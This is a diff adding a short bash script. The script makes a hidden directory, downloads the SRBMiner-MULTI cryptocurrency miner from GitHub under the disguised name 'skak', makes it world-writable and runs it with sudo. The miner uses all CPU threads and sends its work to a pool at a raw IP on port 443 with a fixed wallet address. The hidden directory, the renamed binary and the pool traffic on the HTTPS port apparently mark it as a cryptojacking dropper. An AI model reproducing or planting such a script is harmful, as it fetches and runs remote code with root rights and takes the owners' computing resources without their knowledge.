@@ -1,0 +1,7 @@
+#!/bin/bash
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget -O skak https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
+chmod 777 skak
+sudo ./skak --algorithm yespower --pool 134.122.93.45:443 --wallet v4tjtMCQz5Ygzmj7a7B59iReVDuw5JwhB4.x --password webpassword=x --cpu-threads $(nproc --all)
+
